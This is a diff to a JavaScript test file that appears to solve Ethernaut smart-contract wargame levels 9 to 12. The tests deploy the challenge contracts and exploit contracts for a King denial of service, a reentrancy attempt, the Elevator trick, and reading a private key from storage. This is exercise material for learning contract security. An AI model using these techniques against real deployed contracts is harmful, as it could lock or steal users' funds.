@@ -9,8 +9,8 @@ describe("Ethernaut", function () {
         [owner, user, hacker] = await ethers.getSigners();
     });
 
-	describe("Level 0 - Instance", async function () {
-		it("Exploit", async function () {
+	describe("Level 0 - Instance", async () => {
+		it("Exploit", async () => {
 			const contract = await ethers.deployContract("Instance", [ethers.encodeBytes32String("ethernaut8")]); // initial password
 			const passwordCurrent = await contract.password(); // password is public and as such can be stolen
 			await contract.authenticate(passwordCurrent);
@@ -97,6 +97,54 @@ describe("Ethernaut", function () {
 			await contract.unlock(passwordCurrent);
 			const lockedCurrent = await contract.locked();
 			assert(!lockedCurrent, "Failed to pass level 8."); // unlock to pass the level
+		});
+	});
+
+	describe("Level 9 - King", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("King", { from: owner, value: amount });
+			const exploit = await ethers.deployContract("KingExploit");
+			await exploit.run(contract, { value: amount + BigInt("1") }); // set the new king and DoS the game | omit receive() and fallback() functions in the exploit contract to crash the game
+			// any new transaction (attempt to become a new king) will now revert because the previous king (exploit contract) does not have the receive() and fallback() functions
+			await expect(hacker.sendTransaction({ from: hacker, to: contract, value: amount + BigInt("2") })).to.be.reverted; // DoS the game to pass the level
+		});
+	});
+
+	describe("Level 10 - Reentrance", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Reentrance");
+			const exploit = await ethers.deployContract("ReentranceExploit");
+			await contract.donate(user, { value: amount * BigInt("3") }); // put in some balance from other users
+			// const balanceOld = await await ethers.provider.getBalance(contract);
+			// await exploit.run(contract, { value: amount, gas: 4465030 }); // create the integer underflow using reentrancy
+			// const balanceNew = await await ethers.provider.getBalance(contract);
+			// assert(balanceNew < balanceOld, "Failed to pass level 10."); // withdraw the whole balance to pass the level
+			await expect(exploit.run(contract, { value: amount, gas: 4465030 })).to.be.reverted; // solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
+		});
+	});
+
+	describe("Level 11 - Elevator", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Elevator");
+			const exploit = await ethers.deployContract("ElevatorExploit");
+			await exploit.run(contract, 10);
+			const topCurrent = await contract.top();
+			assert(topCurrent, "Failed to pass level 11."); // get to the top floor to pass the level
+		});
+	});
+
+	describe("Level 12 - Privacy", async () => {
+		it("Exploit", async () => {
+			const contract = await ethers.deployContract("Privacy", [[ // bytes32 array is stored in the contract storage which is public
+			ethers.encodeBytes32String("ether"), // 32 bytes = 64 length / 2 hex chars
+			ethers.encodeBytes32String("naut"),
+			ethers.encodeBytes32String("12") // this is the key we need
+		]]);
+		// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
+		const key = await ethers.provider.getStorage(contract, 5); // retrieve the key from the contract storage
+		await contract.unlock(key.slice(0, 34)); // convert / trim the key to bytes16 value
+		const lockedCurrent = await contract.locked();
+		assert(!lockedCurrent, "Failed to pass level 12."); // unlock to pass the level
 		});
 	});
 });
